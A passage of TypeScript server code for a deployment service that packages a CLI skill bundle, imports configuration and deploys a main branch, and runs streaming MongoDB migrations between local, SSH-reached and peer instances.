source ~/.bashrc

# 3. 初始化（交互式）
cdscli init

# 4. 验证
cdscli auth check
cdscli project list --human
\`\`\`

## 主要命令

| 命令 | 用途 |
|------|------|
| \`cdscli init\` | 首次配置 CDS_HOST / AI_ACCESS_KEY / 默认 projectId |
| \`cdscli scan --apply-to-cds <projectId>\` | 扫描本地 → 生成 compose YAML → 提交 CDS 审批 |
| \`cdscli deploy\` | 推代码 + 部署 + 等待 + 冒烟（一条命令）|
| \`cdscli help-me-check <branchId>\` | 出 bug 了？这条命令抓状态+日志+env+history+根因分析 |
| \`cdscli smoke <branchId>\` | 分层冒烟（L1 根路径 / L2 API / L3 认证 API）|
| \`cdscli --help\` | 完整命令树 |

## 详细文档

| 文件 | 何时看 |
|------|--------|
| \`.claude/skills/cds/SKILL.md\` | Claude Code 自动加载，主入口 |
| \`.claude/skills/cds/reference/api.md\` | 需要 curl 直调 API |
| \`.claude/skills/cds/reference/auth.md\` | 401 / 403 排查 |
| \`.claude/skills/cds/reference/scan.md\` | 扫描规则 & compose YAML 契约 |
| \`.claude/skills/cds/reference/smoke.md\` | 分层冒烟策略 |
| \`.claude/skills/cds/reference/diagnose.md\` | 容器日志 → 根因决策树 |
| \`.claude/skills/cds/reference/drop-in.md\` | 新项目接入完整步骤 |

## 升级

直接重新下载本包覆盖即可，\`~/.cdsrc\` 不受影响。

## 反馈

缺功能 / 新根因模式 / 扫描误判 → 把 \`cdscli diagnose <branchId>\` 输出贴给维护方。
`;
      fs.writeFileSync(path.join(packDir, 'README.md'), readme, 'utf-8');

      // Create tar.gz using tar command (available on all Linux)
      const tarName = `${packName}.tar.gz`;
      execSync(`cd "${tmpDir}" && tar -czf "${tarName}" "${packName}/"`, { stdio: 'pipe' });

      // Clean up pack dir
      fs.rmSync(packDir, { recursive: true, force: true });

      // Send tar.gz
      const tarPath = path.join(tmpDir, tarName);
      const stat = fs.statSync(tarPath);
      res.setHeader('Content-Type', 'application/gzip');
      res.setHeader('Content-Disposition', `attachment; filename="${tarName}"`);
      res.setHeader('Content-Length', stat.size);
      const stream = fs.createReadStream(tarPath);
      stream.pipe(res);
      stream.on('end', () => {
        fs.unlink(tarPath, () => {});
      });
    } catch (e) {
      console.error('export-skill error:', e);
      if (!res.headersSent) {
        res.status(500).json({ error: '导出失败: ' + (e as Error).message });
      }
    }
  });

  // POST /api/import-and-init — import config + start infra + create main branch + deploy (SSE progress)
  // Same config parsing as /import-config, but after applying config it also:
  //   1. Starts all new infra services
  //   2. Creates a main branch worktree (if not exists)
  //   3. Deploys the main branch (build + run all profiles)
  router.post('/import-and-init', async (req, res) => {
    const { config: configBlob } = req.body as { config: unknown };

    // ── Parse config (same logic as import-config) ──
    let cfg: Record<string, unknown>;
    if (typeof configBlob === 'string') {
      const cdsConfig = parseCdsCompose(configBlob);
      if (cdsConfig) {
        cfg = {
          $schema: 'cds-config',
          buildProfiles: cdsConfig.buildProfiles,
          envVars: cdsConfig.envVars,
          infraServices: cdsConfig.infraServices.length > 0 ? cdsConfig.infraServices : undefined,
          routingRules: cdsConfig.routingRules.length > 0 ? cdsConfig.routingRules : undefined,
        };
      } else {
        try {
          cfg = JSON.parse(configBlob);
        } catch {
          res.status(400).json({ error: '无法解析配置：既不是有效的 CDS Compose YAML，也不是有效的 JSON' });
          return;
        }
      }
    } else {
      cfg = configBlob as Record<string, unknown>;
    }

    // Validate
    const validation = validateConfigBlob(cfg);
    if (!validation.valid) {
      res.status(400).json({ valid: false, errors: validation.errors });
      return;
    }

    // ── Start SSE stream ──
    initSSE(res);
    const send = (step: string, status: string, title: string) => {
      sendSSE(res, 'step', { step, status, title, timestamp: new Date().toISOString() });
    };

    try {
      // ── Phase 1: Apply config ──
      send('config', 'running', '正在写入配置...');

      // Apply build profiles
      if (Array.isArray(cfg.buildProfiles)) {
        for (const p of cfg.buildProfiles as BuildProfile[]) {
          const existing = stateService.getBuildProfile(p.id);
          if (existing) {
            stateService.updateBuildProfile(p.id, p);
          } else {
            p.workDir = p.workDir || '.';
            p.containerPort = p.containerPort || 8080;
            stateService.addBuildProfile(p);
          }
        }
      }

      // Apply env vars
      if (cfg.envVars && typeof cfg.envVars === 'object') {
        for (const [key, value] of Object.entries(cfg.envVars as Record<string, string>)) {
          stateService.setCustomEnvVar(key, value);
        }
      }

      // Apply routing rules
      if (Array.isArray(cfg.routingRules)) {
        for (const r of cfg.routingRules as RoutingRule[]) {
          const existing = stateService.getRoutingRules().find(x => x.id === r.id);
          if (existing) {
            stateService.updateRoutingRule(r.id, r);
          } else {
            r.priority = r.priority ?? 0;
            r.enabled = r.enabled ?? true;
            stateService.addRoutingRule(r);
          }
        }
      }

      // Apply infra service definitions (don't start yet)
      // PR_B.1: /import-and-init 历史全局端点没带 projectId — 兜底 legacy。
      const initInfraProjectId =
        stateService.getLegacyProject()?.id ?? 'default';
      const infraDefs = resolveInfraDefs(cfg);
      const newInfraServices: InfraService[] = [];
      for (const def of infraDefs) {
        if (stateService.getInfraService(def.id)) continue;
        if (def.id && def.dockerImage && def.containerPort) {
          const service = composeDefToInfraService(def, initInfraProjectId);
          stateService.addInfraService(service);
          newInfraServices.push(service);
        }
      }

      syncCdsConfig();
      stateService.save();
      send('config', 'done', `配置已写入 (${stateService.getBuildProfiles().length} 个构建配置, ${newInfraServices.length} 个基础设施)`);

      // ── Phase 2: Start infra services ──
      const allInfra = stateService.getInfraServices();
      const infraToStart = allInfra.filter(s => s.status !== 'running');
      if (infraToStart.length > 0) {
        send('infra', 'running', `正在启动 ${infraToStart.length} 个基础设施服务...`);
        for (const svc of infraToStart) {
          send(`infra-${svc.id}`, 'running', `正在启动 ${svc.name} (${svc.dockerImage})...`);
          try {
            // Phase 1: 传项目 customEnv 让 ${VAR} 展开
            await containerService.startInfraService(svc, stateService.getCustomEnv(svc.projectId));
            stateService.updateInfraService(svc.id, { status: 'running', errorMessage: undefined });
            send(`infra-${svc.id}`, 'done', `${svc.name} 已启动 → :${svc.hostPort}`);
          } catch (err) {
            stateService.updateInfraService(svc.id, { status: 'error', errorMessage: (err as Error).message });
            send(`infra-${svc.id}`, 'error', `${svc.name} 启动失败: ${(err as Error).message}`);
          }
        }
        stateService.save();
        send('infra', 'done', '基础设施服务就绪');
      } else {
        send('infra', 'done', '基础设施服务已在运行中');
      }

      // ── Phase 3: Create main branch worktree ──
      // Detect default branch name
      let mainBranch = 'main';
      try {
        const result = await shell.exec('git symbolic-ref refs/remotes/origin/HEAD', { cwd: config.repoRoot, timeout: 5000 });
        const ref = result.stdout.trim(); // e.g., refs/remotes/origin/main
        if (ref) mainBranch = ref.replace('refs/remotes/origin/', '');
      } catch {
        // Fallback: try 'main', then 'master'
        try {
          await shell.exec('git rev-parse --verify origin/main', { cwd: config.repoRoot, timeout: 5000 });
          mainBranch = 'main';
        } catch {
          mainBranch = 'master';
        }
      }

      // PR #498 second-round review (Bugbot): the initialize flow
      // previously used the bare slugified branch as the entry id (and
      // looked up by it), which contradicts every other code path
      // (POST /api/branches, auto-build in index.ts, webhook dispatcher)
      // that uses `${owner.slug}-${slugified}` for non-legacy projects.
      // After rename-default a re-run of init would miss the existing
      // `prd-agent-main` entry and try to create a duplicate `main`.
      //
      // Resolve the owner project up-front so both lookup AND creation
      // share the same id formula, with a (projectId, branch) tuple
      // fallback for legacyFlag-flipped historical entries.
      const mainSlug = StateService.slugify(mainBranch);
      const owner = stateService.resolveProjectForAutoBuild(config.repoRoot);
      if (!owner) {
        send('worktree', 'error', '无法定位项目所属（state 中无可识别的默认项目）');
        res.end();
        return;
      }
      const mainBranchId = owner.legacyFlag ? mainSlug : `${owner.slug}-${mainSlug}`;
      let entry =
        stateService.getBranch(mainBranchId) ??
        stateService.findBranchByProjectAndName(owner.id, mainBranch);

      if (!entry) {
        send('worktree', 'running', `正在为 ${mainBranch} 创建工作树...`);
        const worktreePath = WorktreeService.worktreePathFor(config.worktreeBase, owner.id, mainBranchId);
        await shell.exec(`mkdir -p "${path.posix.dirname(worktreePath)}"`);
        await worktreeService.create(config.repoRoot, mainBranch, worktreePath);

        entry = {
          id: mainBranchId,
          projectId: owner.id,
          branch: mainBranch,
          worktreePath,
          services: {},
          status: 'idle',
          createdAt: new Date().toISOString(),
        };
        stateService.addBranch(entry);
        // 项目刚创建，没默认分支 → 用刚建出来的 main 分支兜底（per-project）。
        // 2026-04-27 (Codex P2): 不再 AND state.defaultBranch — 多项目环境下
        // state.defaultBranch 经常已经被另一个项目设过，这种检查会让新项目
        // 永远拿不到自己的 defaultBranch，downstream getDefaultBranchFor
        // 又被迫回落到别的项目的默认分支，造成 mis-pin。每个项目独立判断。
        const ownerProject = stateService.getProject(owner.id);
        if (!ownerProject?.defaultBranch) {
          stateService.setProjectDefaultBranch(owner.id, entry.id);
        }
        stateService.save();
        send('worktree', 'done', `工作树已创建: ${mainBranch}`);
      } else {
        send('worktree', 'done', `工作树已存在: ${mainBranch}`);
      }

      // ── Phase 4: Deploy main branch (build + run all profiles) ──
      // PR #498 round-4 review (Bugbot): use the project-scoped query
      // so multi-project setups don't deploy every project's profiles
      // under the owner's branch entry. Matches the auto-build path
      // in index.ts:1097 and webhook deploy flows.
      const profiles = stateService.getBuildProfilesForProject(entry.projectId || owner.id);
      if (profiles.length > 0) {
        send('deploy', 'running', `正在部署 ${mainBranch} (${profiles.length} 个服务)...`);

        entry.status = 'building';
        stateService.save();

        // Pre-allocate ports
        for (const profile of profiles) {
          if (!entry.services[profile.id]) {
            const hostPort = stateService.allocatePort(config.portStart);
            entry.services[profile.id] = {
              profileId: profile.id,
              // PR #498 round-3 review (Bugbot): container name must
              // track entry.id. After round-2 made mainBranchId
              // `${owner.slug}-${mainSlug}` for non-legacy projects,
              // the hardcoded `cds-${mainSlug}-…` here became a
              // mismatch — same pattern index.ts:1105 already follows.
              containerName: `cds-${entry.id}-${profile.id}`,
              hostPort,
              status: 'idle',
            };
          }
        }
        stateService.save();

        const mergedEnv = getMergedEnv(entry.projectId);

        for (const profile of profiles) {
          const svc = entry.services[profile.id];
          send(`deploy-${profile.id}`, 'running', `正在构建 ${profile.name}...`);
          svc.status = 'building';

          try {
            await containerService.runService(entry, profile, svc, (chunk) => {
              sendSSE(res, 'log', { profileId: profile.id, chunk });
            }, mergedEnv);

            svc.status = 'running';
            send(`deploy-${profile.id}`, 'done', `${profile.name} 就绪 → :${svc.hostPort}`);
          } catch (err) {
            svc.status = 'error';
            entry.errorMessage = (err as Error).message;
            send(`deploy-${profile.id}`, 'error', `${profile.name} 构建失败: ${(err as Error).message}`);
          }
        }

        const hasError = Object.values(entry.services).some(s => s.status === 'error');
        entry.status = hasError ? 'error' : 'running';
        stateService.save();

        send('deploy', hasError ? 'error' : 'done',
          hasError ? '部分服务构建失败' : `部署完成，所有服务已就绪`);
      }

      send('complete', 'done', '初始化完成');
      sendSSE(res, 'done', { message: '初始化完成' });
    } catch (err) {
      send('error', 'error', `初始化失败: ${(err as Error).message}`);
      sendSSE(res, 'error', { message: (err as Error).message });
    }

    res.end();
  });

  // ── Self-update: switch CDS's own branch, pull, and restart ──

  // ── Data Migration ──

  /** Resolve 'local' MongoDB connection to actual host:port from infra */
  function resolveMongoConn(conn: MongoConnectionConfig): MongoConnectionConfig {
    if (conn.type === 'local') {
      const mongoInfra = stateService.getInfraServices().find(s => s.id === 'mongodb');
      if (!mongoInfra) throw new Error('本机 MongoDB 未在 CDS 基础设施中注册');
      const dockerHost = stateService.getCdsEnvVars()['CDS_HOST'] || '172.17.0.1';
      return { ...conn, host: dockerHost, port: mongoInfra.hostPort };
    }
    return conn;
  }

  /** Build mongosh auth args */
  function mongoAuthArgs(conn: MongoConnectionConfig): string {
    let args = '';
    if (conn.username) args += ` -u ${conn.username}`;
    if (conn.password) args += ` -p ${conn.password}`;
    if (conn.authDatabase) args += ` --authenticationDatabase ${conn.authDatabase}`;
    return args;
  }

  /** Get this CDS's own AI access key (used to display to the user for copy/paste).
   *  优先级：dashboard customEnv 里用户配的 AI_ACCESS_KEY > CDS_AI_ACCESS_KEY (canonical)
   *  > legacy AI_ACCESS_KEY。前者是 dashboard UI 字段名（保持不动），后两个是
   *  CDS 进程级静态钥匙。 */
  function getLocalAccessKey(): string | null {
    return stateService.getCustomEnv()['AI_ACCESS_KEY']
      || process.env.CDS_AI_ACCESS_KEY
      || process.env.AI_ACCESS_KEY
      || null;
  }

  /** Best-effort public base URL of this CDS, derived from the current request */
  function guessLocalBaseUrl(req: import('express').Request): string {
    const proto = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
    const host = (req.headers['x-forwarded-host'] as string) || req.headers.host || 'localhost';
    return `${proto}://${host}`;
  }

  /**
   * Make an authenticated HTTP/S request to a CDS peer. Returns the raw
   * response object so the caller can stream the body.
   */
  function peerRequest(
    peer: CdsPeer,
    apiPath: string,
    method: 'GET' | 'POST' | 'PUT' | 'DELETE',
    body?: unknown,
  ): Promise<http.IncomingMessage> {
    return new Promise((resolve, reject) => {
      let url: URL;
      try { url = new URL(peer.baseUrl.replace(/\/$/, '') + apiPath); } catch (e) { reject(e); return; }
      const lib = url.protocol === 'https:' ? https : http;
      const payload = body !== undefined ? Buffer.from(JSON.stringify(body)) : null;
      const req = lib.request({
        method,
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + url.search,
        headers: {
          'X-AI-Access-Key': peer.accessKey,
          'X-CDS-Peer-Call': '1',
          Accept: 'application/json, application/octet-stream',
          ...(payload ? { 'Content-Type': 'application/json', 'Content-Length': String(payload.length) } : {}),
        },
        // Large dumps can take many minutes — disable the 2-minute default.
        timeout: 0,
      }, (res) => resolve(res));
      req.on('error', reject);
      req.setTimeout(0);
      if (payload) req.write(payload);
      req.end();
    });
  }

  /** Make a peer request and parse the response body as JSON */
  async function peerRequestJson<T>(peer: CdsPeer, apiPath: string, method: 'GET' | 'POST' | 'PUT' | 'DELETE', body?: unknown): Promise<T> {
    const res = await peerRequest(peer, apiPath, method, body);
    const chunks: Buffer[] = [];
    for await (const c of res) chunks.push(c as Buffer);
    const text = Buffer.concat(chunks).toString('utf-8');
    if ((res.statusCode || 500) >= 400) {
      let err = text;
      try { const j = JSON.parse(text); err = j.error || j.message || text; } catch { /* raw */ }
      throw new Error(`远程 CDS 返回 ${res.statusCode}: ${err}`);
    }
    try { return JSON.parse(text) as T; } catch { return text as unknown as T; }
  }

  // GET /api/data-migrations — list all migration tasks
  router.get('/data-migrations', (_req, res) => {
    res.json(stateService.getDataMigrations());
  });

  // POST /api/data-migrations — create a new migration task
  router.post('/data-migrations', (req, res) => {
    const { name, dbType, source, target, collections } = req.body as {
      name: string;
      dbType: 'mongodb';
      source: MongoConnectionConfig;
      target: MongoConnectionConfig;
      collections?: string[];
    };
    if (!name || !dbType || !source || !target) {
      res.status(400).json({ error: '缺少必填字段: name, dbType, source, target' });
      return;
    }
    const id = `mig-${Date.now().toString(36)}`;
    const migration: DataMigration = {
      id,
      name,
      dbType,
      source,
      target,
      collections: collections?.length ? collections : undefined,
      status: 'pending',
      progress: 0,
      createdAt: new Date().toISOString(),
    };
    stateService.addDataMigration(migration);
    stateService.save();
    res.json(migration);
  });

  // DELETE /api/data-migrations/:id — delete a migration task
  router.delete('/data-migrations/:id', (req, res) => {
    const { id } = req.params;
    const migration = stateService.getDataMigration(id);
    if (!migration) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    if (migration.status === 'running') { res.status(400).json({ error: '任务正在运行中，无法删除' }); return; }
    stateService.removeDataMigration(id);
    stateService.save();
    res.json({ message: '已删除' });
  });

  // POST /api/data-migrations/check-tools — check if mongodump/mongorestore are available, auto-install if not
  router.post('/data-migrations/check-tools', async (_req, res) => {
    try {
      // Check if mongodump exists
      const checkResult = await shell.exec('which mongodump 2>/dev/null || which /usr/bin/mongodump 2>/dev/null || echo "NOT_FOUND"');
      const hasTool = !checkResult.stdout.includes('NOT_FOUND');
      if (hasTool) {
        // Get version
        const verResult = await shell.exec('mongodump --version 2>&1 | head -1');
        res.json({ installed: true, version: verResult.stdout.trim() });
        return;
      }
      // Auto-install mongodb-database-tools
      res.json({ installed: false, message: '正在安装 mongodb-database-tools...' });
    } catch (e) {
      res.status(500).json({ error: (e as Error).message });
    }
  });

  // POST /api/data-migrations/install-tools — install mongodump/mongorestore
  router.post('/data-migrations/install-tools', async (_req, res) => {
    initSSE(res);
    const send = (msg: string) => sendSSE(res, 'progress', { message: msg });
    try {
      send('检测操作系统...');
      const osInfo = await shell.exec('cat /etc/os-release 2>/dev/null || echo "unknown"');
      const isDebian = osInfo.stdout.includes('debian') || osInfo.stdout.includes('ubuntu');
      const isAlpine = osInfo.stdout.includes('alpine');
      const isRhel = osInfo.stdout.includes('rhel') || osInfo.stdout.includes('centos') || osInfo.stdout.includes('fedora');

      if (isDebian) {
        send('检测到 Debian/Ubuntu，正在安装 mongodb-database-tools...');
        // Try apt-get first
        const aptResult = await shell.exec(
          'apt-get update -qq 2>/dev/null && apt-get install -y -qq mongodb-database-tools 2>&1 || echo "APT_FAILED"',
          { timeout: 120000 }
        );
        if (aptResult.stdout.includes('APT_FAILED')) {
          // Fallback: download from MongoDB directly
          send('apt 安装失败，尝试直接下载二进制文件...');
          await installMongoToolsBinary(shell, send);
        } else {
          send('apt 安装成功');
        }
      } else if (isAlpine) {
        send('检测到 Alpine，直接下载二进制文件...');
        await installMongoToolsBinary(shell, send);
      } else if (isRhel) {
        send('检测到 RHEL/CentOS，正在安装...');
        const yumResult = await shell.exec(
          'yum install -y mongodb-database-tools 2>&1 || dnf install -y mongodb-database-tools 2>&1 || echo "YUM_FAILED"',
          { timeout: 120000 }
        );
        if (yumResult.stdout.includes('YUM_FAILED')) {
          send('yum 安装失败，尝试直接下载二进制文件...');
          await installMongoToolsBinary(shell, send);
        }
      } else {
        send('未知系统，尝试直接下载二进制文件...');
        await installMongoToolsBinary(shell, send);
      }

      // Verify installation
      const verifyResult = await shell.exec('mongodump --version 2>&1 | head -1');
      if (verifyResult.exitCode === 0 && verifyResult.stdout.trim()) {
        sendSSE(res, 'done', { installed: true, version: verifyResult.stdout.trim() });
      } else {
        sendSSE(res, 'error', { message: '安装后验证失败，请手动安装 mongodb-database-tools' });
      }
      res.end();
    } catch (e) {
      sendSSE(res, 'error', { message: (e as Error).message });
      res.end();
    }
  });

  // PUT /api/data-migrations/:id — edit a migration task (name, source, target, collections)
  router.put('/data-migrations/:id', (req, res) => {
    const { id } = req.params;
    const existing = stateService.getDataMigration(id);
    if (!existing) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    if (existing.status === 'running') { res.status(400).json({ error: '任务正在运行中，无法编辑' }); return; }
    const { name, source, target, collections } = req.body as Partial<DataMigration>;
    const updates: Partial<DataMigration> = {};
    if (name !== undefined) updates.name = name;
    if (source !== undefined) updates.source = source;
    if (target !== undefined) updates.target = target;
    // collections === [] means "all collections" (undefined), non-empty = subset
    if (collections !== undefined) updates.collections = (collections && collections.length) ? collections : undefined;
    updates.updatedAt = new Date().toISOString();
    stateService.updateDataMigration(id, updates);
    stateService.save();
    res.json(stateService.getDataMigration(id));
  });

  // POST /api/data-migrations/:id/execute — execute a migration task (SSE stream, streaming pipeline)
  //
  // Pipeline:
  //   source producer (mongodump stdout) → pipe → target consumer (mongorestore stdin)
  //
  // Producers (by source.type):
  //   - local  : spawn mongodump against CDS infra MongoDB
  //   - remote : spawn mongodump; or ssh jump → remote mongodump (pipe mode, no port forwarding)
  //   - cds    : HTTP POST to peer's /local-dump endpoint, read response body
  //
  // Consumers (by target.type):
  //   - local  : spawn mongorestore against CDS infra MongoDB, write to stdin
  //   - remote : spawn mongorestore; or ssh jump → remote mongorestore (stdin pipe)
  //   - cds    : HTTP POST to peer's /local-restore endpoint, request body is the stream
  //
  // Zero temp files. Archive+gzip throughout. SSH keepalive so long dumps don't drop.
  router.post('/data-migrations/:id/execute', async (req, res) => {
    const { id } = req.params;
    const migration = stateService.getDataMigration(id);
    if (!migration) { res.status(404).json({ error: '迁移任务不存在' }); return; }
    if (migration.status === 'running') { res.status(400).json({ error: '任务已在运行中' }); return; }

    initSSE(res);
    const send = (progress: number, message: string) => {
      sendSSE(res, 'progress', { progress, message });
      stateService.updateDataMigration(id, { progress, progressMessage: message });
    };

    // SSE keepalive — prevents proxies from closing the connection on long dumps
    const keepAlive = setInterval(() => { try { res.write(`:ka\n\n`); } catch { /* client gone */ } }, 15000);

    // Mark as running
    stateService.updateDataMigration(id, { status: 'running', startedAt: new Date().toISOString(), progress: 0, errorMessage: undefined, log: '' });
    stateService.save();

    let logOutput = '';
    const MAX_LOG = 64 * 1024;
    const appendLog = (line: string) => {
      logOutput += line;
      if (!line.endsWith('\n')) logOutput += '\n';
      if (logOutput.length > MAX_LOG) logOutput = '...(truncated)...\n' + logOutput.slice(-MAX_LOG);
    };

    // Persist log + progress periodically (not on every chunk) to avoid disk thrash
    let lastPersistAt = 0;
    const maybePersist = () => {
      const now = Date.now();
      if (now - lastPersistAt > 2000) {
        lastPersistAt = now;
        stateService.updateDataMigration(id, { log: logOutput });
        stateService.save();
      }
    };

    // Resources to clean up on exit
    const children: Array<{ kill: () => void }> = [];
    const cleanup = () => {
      clearInterval(keepAlive);
      for (const c of children) { try { c.kill(); } catch { /* */ } }
    };

    // Track the most recent progress line so we can turn it into SSE progress
    let fakeProgress = 20; // ratchet 20→90 based on line activity
    const bumpProgress = (delta: number) => { fakeProgress = Math.min(90, fakeProgress + delta); };
    const updateProgressFromLine = (line: string) => {
      const parsed = parseMongoProgressLine(line);
      if (parsed) {
        bumpProgress(1);
        send(fakeProgress, parsed);
      }
    };

    try {
      const cols = migration.collections?.length ? migration.collections : undefined;

      send(2, '准备迁移管道...');

      // ── Build producer ──
      const producer = await buildSourceProducer(
        migration.source,
        cols,
        { appendLog, onProgressLine: updateProgressFromLine, send },
      );
      children.push(producer);

      // ── Build consumer ──
      const consumer = await buildTargetConsumer(
        migration.target,
        migration.source,
        cols,
        { appendLog, onProgressLine: updateProgressFromLine, send },
      );
      children.push(consumer);

      send(15, '管道已建立，开始传输...');

      // Pipe producer → consumer with error propagation
      producer.stdout.on('error', (err: Error) => appendLog(`[pipe] producer error: ${err.message}`));
      consumer.stdin.on('error', (err: Error) => appendLog(`[pipe] consumer error: ${err.message}`));
      producer.stdout.pipe(consumer.stdin);

      // Persist log every few seconds while streaming
      const persistTimer = setInterval(maybePersist, 2000);

      // Wait for both producer and consumer to finish
      await Promise.all([producer.done, consumer.done]);
      clearInterval(persistTimer);

      send(100, '迁移完成！');
      stateService.updateDataMigration(id, {
        status: 'completed',
        progress: 100,
        progressMessage: '迁移完成',
        finishedAt: new Date().toISOString(),
        log: logOutput,
      });
      stateService.save();
      sendSSE(res, 'done', { message: '迁移完成' });
      cleanup();
      res.end();
    } catch (e) {
      const errMsg = (e as Error).message || String(e);
      appendLog(`ERROR: ${errMsg}`);
      stateService.updateDataMigration(id, {
        status: 'failed',
        errorMessage: errMsg,
        finishedAt: new Date().toISOString(),
        log: logOutput,
      });
      stateService.save();
      sendSSE(res, 'error', { message: errMsg });
      cleanup();
      res.end();
    }
  });

  /**
   * Build a producer that emits a `mongodump --archive --gzip` byte stream.
   * Returns a handle with a readable `stdout`, a `done` promise, and `kill()`.
   */
  async function buildSourceProducer(
    source: MongoConnectionConfig,
    cols: string[] | undefined,
    cb: {
      appendLog: (s: string) => void;
      onProgressLine: (line: string) => void;
      send: (progress: number, message: string) => void;
    },
  ): Promise<{ stdout: NodeJS.ReadableStream; stdin?: NodeJS.WritableStream; done: Promise<void>; kill: () => void }> {
    // ── CDS peer source ── fetch from peer's local-dump
    if (source.type === 'cds') {
      const peer = stateService.getCdsPeer(source.cdsPeerId || '');
      if (!peer) throw new Error(`源 CDS 密钥不存在: ${source.cdsPeerId}`);
      cb.send(8, `连接源 CDS 「${peer.name}」...`);
      const peerRes = await peerRequest(peer, '/api/data-migrations/local-dump', 'POST', {
        database: source.database,
        collections: cols,
      });
      if ((peerRes.statusCode || 500) >= 400) {
        const chunks: Buffer[] = [];
        for await (const c of peerRes) chunks.push(c as Buffer);
        throw new Error(`源 CDS 返回 ${peerRes.statusCode}: ${Buffer.concat(chunks).toString('utf-8').slice(0, 400)}`);
      }
      cb.appendLog(`[source] CDS peer ${peer.name} (${peer.baseUrl}) streaming`);
      const done = new Promise<void>((resolve, reject) => {
        peerRes.on('end', resolve);
        peerRes.on('error', reject);
      });
      return {
        stdout: peerRes,
        done,
        kill: () => { try { peerRes.destroy(); } catch { /* */ } },
      };
    }

    // ── Local / remote via mongodump ──
    const eff = source.type === 'local' ? resolveMongoConn(source) : source;
    const dumpArgs = buildMongodumpArgs(
      eff.host, eff.port,
      { username: eff.username, password: eff.password, authDatabase: eff.authDatabase },
      eff.database, cols,
    );

    let cmd: string;
    let argv: string[];
    if (source.sshTunnel?.enabled) {
      cb.send(8, `通过 SSH 连接 ${source.sshTunnel.host}...`);
      const sshBase = buildSshBase(source.sshTunnel);
      const remoteCmd = buildRemoteMongoCmd('mongodump', dumpArgs, source.sshTunnel.dockerContainer);
      cb.appendLog(`[source] ssh ${source.sshTunnel.username}@${source.sshTunnel.host}: ${remoteCmd}`);
      cmd = 'ssh';
      argv = [...sshBase, remoteCmd];
    } else {
      cb.appendLog(`[source] mongodump ${dumpArgs.join(' ')}`);
      cmd = 'mongodump';
      argv = dumpArgs;
    }

    const child = spawn(cmd, argv, { stdio: ['ignore', 'pipe', 'pipe'] });
    let stderrTail = '';
    child.stderr!.on('data', (d: Buffer) => {
      const s = d.toString();
      stderrTail = (stderrTail + s).slice(-2000);
      for (const line of s.split('\n')) {
        if (line) { cb.appendLog(`[dump] ${line}`); cb.onProgressLine(line); }
      }
    });
    const done = new Promise<void>((resolve, reject) => {
      child.on('close', (code) => {
        if (code === 0) resolve();
        else reject(new Error(`mongodump 失败 (exit ${code}): ${stderrTail.slice(-400)}`));
      });
      child.on('error', (err) => reject(new Error(`无法启动 mongodump: ${err.message}`)));
    });
    return {
      stdout: child.stdout!,
      done,
      kill: () => { try { child.kill('SIGKILL'); } catch { /* */ } },
    };
  }

  /**
   * Build a consumer that accepts a `mongodump --archive --gzip` byte stream.
   * Returns a handle with a writable `stdin`, a `done` promise, and `kill()`.
   */
  async function buildTargetConsumer(
    target: MongoConnectionConfig,
    source: MongoConnectionConfig,
    cols: string[] | undefined,
    cb: {
      appendLog: (s: string) => void;
      onProgressLine: (line: string) => void;
      send: (progress: number, message: string) => void;
    },
  ): Promise<{ stdin: NodeJS.WritableStream; done: Promise<void>; kill: () => void }> {
    // ── CDS peer target ──
    if (target.type === 'cds') {
      const peer = stateService.getCdsPeer(target.cdsPeerId || '');
      if (!peer) throw new Error(`目标 CDS 密钥不存在: ${target.cdsPeerId}`);
      cb.send(12, `连接目标 CDS 「${peer.name}」...`);
      // Build URL with query params for target rename + collection filter
      const qs = new URLSearchParams();
      if (source.database) qs.set('sourceDb', source.database);
      if (target.database) qs.set('targetDb', target.database);
      if (cols && cols.length) qs.set('collections', cols.join(','));
      const apiPath = '/api/data-migrations/local-restore' + (qs.toString() ? '?' + qs.toString() : '');
      const url = new URL(peer.baseUrl.replace(/\/$/, '') + apiPath);
      const lib = url.protocol === 'https:' ? https : http;
      const httpReq = lib.request({
        method: 'POST',
        protocol: url.protocol,
        hostname: url.hostname,
        port: url.port || (url.protocol === 'https:' ? 443 : 80),
        path: url.pathname + url.search,
        headers: {
          'X-AI-Access-Key': peer.accessKey,
          'X-CDS-Peer-Call': '1',
          'Content-Type': 'application/octet-stream',
          // Chunked transfer (no Content-Length, just stream)
          'Transfer-Encoding': 'chunked',
        },
        timeout: 0,
      });
      httpReq.setTimeout(0);
      cb.appendLog(`[target] CDS peer ${peer.name} → ${apiPath}`);

      const done = new Promise<void>((resolve, reject) => {
        httpReq.on('response', (peerRes) => {
          const chunks: Buffer[] = [];
          peerRes.on('data', (d) => chunks.push(d as Buffer));
          peerRes.on('end', () => {
            const text = Buffer.concat(chunks).toString('utf-8');
            try {
              const j = JSON.parse(text);
              if (j && j.log) for (const line of String(j.log).split('\n')) if (line) { cb.appendLog(`[restore] ${line}`); cb.onProgressLine(line); }
            } catch { cb.appendLog(`[target] ${text.slice(0, 500)}`); }
            if ((peerRes.statusCode || 500) >= 400) {
              reject(new Error(`目标 CDS 返回 ${peerRes.statusCode}: ${text.slice(0, 400)}`));
            } else {
              resolve();
            }
          });
          peerRes.on('error', reject);
        });
        httpReq.on('error', (err) => reject(new Error(`连接目标 CDS 失败: ${err.message}`)));
      });

      return {
        stdin: httpReq,
        done,
        kill: () => { try { httpReq.destroy(); } catch { /* */ } },
      };
    }

    // ── Local / remote via mongorestore ──
    const eff = target.type === 'local' ? resolveMongoConn(target) : target;
    const restoreArgs = buildMongorestoreArgs(
      eff.host, eff.port,
      { username: eff.username, password: eff.password, authDatabase: eff.authDatabase },
      {
        drop: true,
        sourceDb: source.type !== 'cds' ? source.database : undefined,
        targetDb: eff.database,
        collections: cols,
      },
    );

    let cmd: string;
    let argv: string[];
    if (target.sshTunnel?.enabled) {
      cb.send(12, `通过 SSH 连接 ${target.sshTunnel.host}...`);
      const sshBase = buildSshBase(target.sshTunnel);
      const remoteCmd = buildRemoteMongoCmd('mongorestore', restoreArgs, target.sshTunnel.dockerContainer);
      cb.appendLog(`[target] ssh ${target.sshTunnel.username}@${target.sshTunnel.host}: ${remoteCmd}`);
      cmd = 'ssh';
      argv = [...sshBase, remoteCmd];
    } else {
      cb.appendLog(`[target] mongorestore ${restoreArgs.join(' ')}`);
      cmd = 'mongorestore';
      argv = restoreArgs;
    }

    const child = spawn(cmd, argv, { stdio: ['pipe', 'pipe', 'pipe'] });
